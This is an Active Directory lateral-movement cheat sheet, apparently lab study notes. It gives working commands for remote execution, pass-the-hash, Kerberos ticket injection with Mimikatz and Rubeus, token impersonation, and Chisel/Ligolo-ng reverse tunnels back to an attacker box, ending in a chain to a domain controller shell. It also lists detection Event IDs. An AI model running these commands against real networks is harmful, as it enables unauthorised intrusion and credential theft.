# AD Lateral Movement — Cheat Sheet

> Phase: **Lateral Movement / Pivoting**
> Goal: use harvested credentials/hashes/tickets to move host-to-host (move → harvest → move again) until reaching the Domain Controller.

## Variables used

| Placeholder | Meaning |
|---|---|
| `<TARGET_IP>` | Target host IP |
| `<DC_IP>` | Domain Controller IP |
| `<PIVOT_IP>` | Pivot/jump host IP |
| `<DOMAIN>` | Domain name, e.g. `thm.loc` |
| `<USER>` / `<PASS>` | Credential pair |
| `<HASH>` | NT hash (32 hex chars) |
| `<LOCAL_PORT>` | Local port opened on attack box |
| `<REMOTE_PORT>` | Port on the far side of the tunnel |

---

## 1. Concept

Lateral movement = authenticating to other hosts with **valid creds/hashes/tickets** harvested from a host you already own — not exploiting new vulns. "We're not breaking down doors; we're walking through them with stolen keys."

**Core loop:** `move → harvest → move again` until objective reached (usually DC / Domain Admin).

### Prerequisites

| Requirement | Detail |
|---|---|
| Valid credentials | Plaintext password, NT hash, or Kerberos ticket |
| Admin access on target | Most remote-exec tools need local Administrators group membership; WinRM also accepts **Remote Management Users** |

### The three pillars

| Pillar | What it is | Covered in |
|---|---|---|
| Remote Execution | Run commands on a remote host via legit admin protocols (SMB/SCM, WinRM, WMI, DCOM) | §2 |
| Credential Reuse | Pass-the-Hash, Pass-the-Ticket, Overpass-the-Hash, token impersonation | §3 |
| Pivoting | Tunnel traffic through a compromised host to reach segmented networks | §4 |

---

## 2. Remote Execution

### 2.1 PsExec (Impacket) — SYSTEM shell, noisy

**Mechanism:**
1. Auth over SMB (445), open `IPC$`
2. Upload random-named service binary to `ADMIN$` (→ `C:\Windows\`)
3. `CreateServiceW` via `\PIPE\svcctl` → **Event ID 7045** (new service installed)
4. `StartServiceW` → runs as **LocalSystem**, I/O via named pipes
5. On exit: service stopped, deleted, binary removed

> Because the command runs as the **service**, you get a **SYSTEM** shell, not a shell as the authenticated user.

**Verify admin access first:**
```bash
nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -d <DOMAIN>
```

**Run PsExec:**
```bash
psexec.py <DOMAIN>/<USER>:'<PASS>'@<TARGET_IP>
```

### 2.2 Evil-WinRM — quieter, runs as authenticated user

WinRM = remote shell over HTTP (5985) / HTTPS (5986), same protocol PowerShell Remoting uses. Enabled by default on Windows Server.

| | PsExec | Evil-WinRM |
|---|---|---|
| Shell context | SYSTEM | Authenticated user |
| Group requirement | Local Administrators (ADMIN$ write) | Administrators **or** Remote Management Users |
| Noise | Writes file, creates service, Event ID 7045 | No disk write, no service — just Event ID 4624 Type 3 |

```bash
evil-winrm -i <TARGET_IP> -u <USER> -p '<PASS>'
```

Hash-based auth (pairs with Pass-the-Hash):
```bash
evil-winrm -i <TARGET_IP> -u Administrator -H <HASH>
```

### 2.3 Other remote execution methods

| Method | Tool | Mechanism | Noise | When to use |
|---|---|---|---|---|
| WMI | `wmiexec.py` | DCOM `Win32_Process.Create` | Lower — no service, no disk write | PsExec blocked/detected |
| DCOM | `dcomexec.py` | `MMC20.Application` / `ShellWindows` COM objects | Low — legit COM automation | SCM locked down but DCOM open |
| SMBExec | `smbexec.py` | Service runs `cmd.exe /c`, output to temp file | Medium — still Event ID 7045, no binary on disk | AV catches PsExec binary upload |
| AtExec | `atexec.py` | One-shot Task Scheduler RPC | Medium — Event ID 4698 | SCM and DCOM both locked down |
| RDP | `xfreerdp` / `rdesktop` | Full GUI session (3389) | High — Event ID 4624 Type 10 | Need GUI |
| NetExec | `nxc smb <IP> -x "<cmd>"` | SMB one-off command exec | Varies | Quick command, no interactive shell needed |

```bash
# cmd.exe execution
nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -d <DOMAIN> -x 'whoami /all'

# PowerShell execution (uppercase -X)
nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -d <DOMAIN> -X '$PSVersionTable'
```

### 2.4 Detection cheat-sheet (Event IDs)

| Event ID | Log | Indicates |
|---|---|---|
| 4624 (Type 3) | Security | Network logon — any SMB/WinRM/WMI technique |
| 4648 | Security | Logon using explicit credentials |
| 7045 | System | New service installed — **PsExec / SMBExec signature** |
| 4697 | Security | Service installed (newer equivalent of 7045) |
| 4698 | Security | Scheduled task created — **AtExec signature** |
| 4688 | Security | Process creation (needs command-line auditing enabled) |

> Strongest PsExec tell: **Event ID 7045** + a short randomized service name.

---

## 3. Credential Reuse

### 3.1 How Pass-the-Hash works

NTLM auth = challenge-response. Server sends a nonce, client encrypts it with the **NT hash**, server checks the response. Plaintext password is never used — so if you have the hash, you can complete the handshake without the password.

### 3.2 The Hash Confusion Trap ⚠️

| Type | Source | Format | Pass-the-Hash capable? |
|---|---|---|---|
| **NT hash** | SAM / NTDS.dit / LSASS memory (Mimikatz, secretsdump) | 32 hex chars, e.g. `fa0af7f6a73316dd59f0be812dbf3c12` | ✅ Yes |
| **Net-NTLMv2 hash** | Captured off the wire (Responder, `.url` coercion, LLMNR poisoning) | Multi-field: `user::DOMAIN:challenge:hmac:blob` | ❌ No — crack or relay only |

> Only use NT hashes (from memory/DB dumps) for PtH. Net-NTLMv2 is a one-time artifact — relay it or crack it offline.

### 3.3 Reading loot format

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fa0af7f6a73316dd59f0be812dbf3c12:::
```
`username:RID:LM_hash:NT_hash:::` — RID 500 = built-in Administrator. Empty/disabled LM hash is normal on modern Windows.

### 3.4 Spraying a hash across hosts — NetExec

```bash
nxc smb <TARGET_IP1> <TARGET_IP2> -u Administrator -H <HASH> --local-auth
```
- `--local-auth` is **critical** when passing a *local* account hash — forces auth against the target's local SAM, not the domain. Omit it when passing a domain account's hash.

### 3.5 Getting a shell with Pass-the-Hash

```bash
# Full LM:NT format
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<HASH> Administrator@<TARGET_IP>

# NT-only (leave LM empty)
psexec.py -hashes :<HASH> Administrator@<TARGET_IP>
```

Evil-WinRM equivalent:
```bash
evil-winrm -i <TARGET_IP> -u Administrator -H <HASH>
```

### 3.6 Pass-the-Ticket (PtT)

Inject a stolen Kerberos ticket (TGT or service ticket) instead of a hash. Useful when NTLM is restricted but Kerberos is open.

```
# Mimikatz
mimikatz # kerberos::ptt ticket.kirbi
```
```powershell
# Rubeus
Rubeus.exe ptt /ticket:ticket.kirbi
```

### 3.7 Overpass-the-Hash (Pass-the-Key)

Convert an NT hash into a legitimate Kerberos TGT request to the KDC.

```
mimikatz # sekurlsa::pth /user:Administrator /domain:<DOMAIN> /ntlm:<HASH> /run:cmd.exe
```
> `whoami` in the spawned shell shows the original user, but `klist` reveals the injected Kerberos identity.

### 3.8 Token Impersonation

If you already have SYSTEM, steal another logged-on user's access token — no creds/hashes needed.

```
meterpreter > use incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token "DOMAIN\\Administrator"
```
> Gold mine if a Domain Admin happens to be logged into the same box.

---

## 4. Pivoting

When a target (e.g. the DC, or an internal web app) isn't directly reachable from your attack box, tunnel through a host that *can* reach it.

### 4.1 SSH Local Port Forward (`-L`) — one fixed destination

```bash
ssh -L <LOCAL_PORT>:<DC_IP>:<REMOTE_PORT> <USER>@<PIVOT_IP> -N
```
- Mnemonic: **`-L` = Local listens.** Left side (`<LOCAL_PORT>`) = port opened on your box. Right side (`<DC_IP>:<REMOTE_PORT>`) = what the pivot dials, from *its* perspective.
- `-N` = don't execute a remote command, tunnel only.

Example — reach DC's RDP through a WebServer pivot:
```bash
ssh -L 13389:192.168.13.100:3389 jdoe@192.168.13.71 -N
xfreerdp /v:127.0.0.1:13389 /u:Administrator /p:'<PASS>' /cert:ignore
```

### 4.2 SSH Dynamic Port Forward (`-D`) — SOCKS proxy, any destination

```bash
ssh -f -D 1080 <USER>@<PIVOT_IP> -N
```
- `-f` → background after auth
- `-D 1080` → opens a SOCKS proxy on `127.0.0.1:1080`

### 4.3 ProxyChains setup

Edit `/etc/proxychains.conf`, set the `[ProxyList]` last line to:
```
socks4 127.0.0.1 1080
```

Usage — wrap any TCP tool:
```bash
proxychains curl -s http://<TARGET_IP> | head -20
proxychains nxc smb <DC_IP> -u Administrator -H <HASH>
proxychains psexec.py -hashes :<HASH> <DOMAIN>/Administrator@<DC_IP>
```

Firefox via SOCKS: Settings → Network → Manual proxy → SOCKS Host `127.0.0.1`, Port `1080`, SOCKS v4.

### 4.4 ProxyChains caveats

- **TCP only** — UDP/ICMP silently dropped (`nmap -sU`, `ping` won't work)
- Use `nmap -sT` (connect scan), **never** `-sS` (needs raw sockets)
- Always add `-Pn` (skip ICMP host discovery)
- DNS can leak — uncomment `proxy_dns` in `proxychains.conf` to resolve hostnames through the tunnel too

### 4.5 Chisel (when SSH isn't available, e.g. Windows pivot)

```bash
# AttackBox (server)
chisel server --port 8080 --reverse

# Compromised Windows host (client)
chisel.exe client <ATTACKBOX_IP>:8080 R:1080:socks
```
Tunnels a SOCKS proxy over **HTTP** — bypasses firewalls allowing only outbound web traffic.

### 4.6 Ligolo-ng (TUN-interface pivoting, no ProxyChains needed)

```bash
# AttackBox (proxy)
sudo ./proxy -selfcert

# Compromised host (agent)
./agent -connect <ATTACKBOX_IP>:11601 -accept-fingerprint <FINGERPRINT>

# AttackBox — add route, tools work natively
sudo ip route add 192.168.13.0/24 dev ligolo
nxc smb 192.168.13.0/24 -u jdoe -p '<PASS>'
```
> No ProxyChains/SOCKS wrapping or `-sT -Pn` workarounds — preferred for complex multi-pivot engagements, steeper learning curve than SSH.

---

## 5. Full Chain Example (Move → Harvest → Move Again)

```
1. SSH foothold on WebServer
2. PsExec → SYSTEM shell on WRK (local admin creds) → harvest local Admin NT hash
3. NetExec spray hash --local-auth → find it works on SERVER1
4. Pass-the-Hash (psexec.py -hashes :<HASH>) → SYSTEM on SERVER1
   → discover a Domain Admin NT hash left on disk
5. DC unreachable directly → pivot:
   ssh -f -D 1080 jdoe@WebServer -N  (or -L for single service)
6. proxychains nxc smb <DC_IP> -u Administrator -H <DA_HASH>   → confirm Pwn3d!
7. proxychains psexec.py -hashes :<DA_HASH> <DOMAIN>/Administrator@<DC_IP>
   → SYSTEM shell on the Domain Controller
```
